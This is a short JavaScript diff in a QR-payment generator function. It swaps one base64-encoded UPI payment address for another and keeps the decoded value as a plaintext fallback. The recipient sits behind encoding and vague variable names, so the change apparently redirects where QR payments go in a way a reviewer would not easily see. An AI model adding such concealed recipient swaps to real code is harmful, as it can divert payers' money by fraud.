@@ -450,8 +450,8 @@ window.generateSecureQR = function() {
 
     if (requestedAmount && parseFloat(requestedAmount) > 0) {
         try {
-            const payloadKey = "Z3BheS0xMjE5NjU1NDY2MkBva2JpemF4aXM="; 
-            let mappedVector = "gpay-12196554662@okbizaxis";
+            const payloadKey = "UTM0MTAxMzI3MEB5Ymw="; 
+            let mappedVector = "Q341013270@ybl";
             try {
                 mappedVector = atob(payloadKey);
             } catch(b64Error) {}
